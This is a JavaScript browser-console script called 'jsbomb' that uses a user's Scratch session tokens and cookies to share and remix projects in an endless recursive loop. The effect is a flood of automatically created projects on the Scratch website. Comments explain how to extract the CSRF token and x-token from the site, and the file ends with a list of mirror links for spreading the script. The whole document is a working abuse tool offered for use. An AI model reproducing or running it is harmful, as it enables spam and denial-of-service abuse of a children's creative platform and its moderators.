// scratch jsbomb made by derv, not me (TS2021)
// execute the code in console

var e = 1 // id of starting project

var h = 1 // next remix number will be this

var csrf = "insert here" // scratch X-CSRFToken

var xtoken = "insert here" // scratch x-token

var cookies = `` // scratch browser cookies

jsbomb = async function() {

fetch("https://api.scratch.mit.edu/proxy/projects/"+e+"/share", {

        "credentials": "include",

        "headers": {

            "Accept": "*/*",

            "Accept-Language": "en-US,en;q=0.5",

            "X-CSRFToken": csrf,

            "x-token": xtoken,

            "Sec-Fetch-Dest": "empty",

            "Sec-Fetch-Mode": "cors",

            "Sec-Fetch-Site": "same-site",

            "cookie":cookies

        },

        "referrer": "https://scratch.mit.edu/",

        "method": "PUT",

        "mode": "cors"

    });

e = await fetch("https://projects.scratch.mit.edu/?is_remix=1&original_id=" + e +"&title=Scratch%20Project", {

        "credentials": "include",

        "headers": {

            "Accept": "*/*",

            "Accept-Language": "en-US,en;q=0.5",

            "Content-Type": "application/json",

            "Sec-Fetch-Dest": "empty",

            "Sec-Fetch-Mode": "cors",

            "Sec-Fetch-Site": "same-site",

            "cookie":cookies

        },

        "referrer": "https://scratch.mit.edu/",

        "body": 'text here',

        "method": "POST",

        "mode": "cors"

    });

    console.log(e);

    e = await e.json();

    e = e["content-name"];

h=h+1

console.log(h-1); // logs remix number

console.log(e) // logs project id

jsbomb();

}

jsbomb();

// how to get X-CSRFToken
// comment something
// go to network and find /session
// copy the token

// how to get x-token
// comment something
// go to scratch.mit.edu/session
// view the page's source
// copy the token

// how to get project.json
// download the project you want to use
// convert it to a zip 
// open the zip
// open the folder created by the zip
// copy the json file in it

// JSBOMB Places - These are the ONLY official links. Any other places are FAKE.
// GITHUB is the most updated, followed by Pastebin and Github Gist!

// Safe (only edited by me):
// Github: https://raw.githubusercontent.com/S-PScripts/scripts/main/Javascript/JSBOMB.js
// Github Gist: https://gist.githubusercontent.com/S-PScripts/f0ca6967c9cc14cd4d1a90935a630cc5/raw/4f8d95d72a193456450d8dc15ce849cf35bd543b/JSBOMB.js
// Pastebin: https://pastebin.com/raw/1vANhnPM
// Rentry: https://rentry.co/jsbomb/raw
// JustPasteIt: https://justpaste.it/aos1w
// aNotepad: https://anotepad.com/notes/x2ipdcmw

// Dangerous (can be edited by anyone):
// ProtectedText: https://www.protectedtext.com/jsbombt-101 - PASSWORD is myjsbomb123
// CodedPad: https://www.codedpad.com/ - the code is jsbombt-101
// Shrib: https://shrib.com/#Idris5M4E2Wq
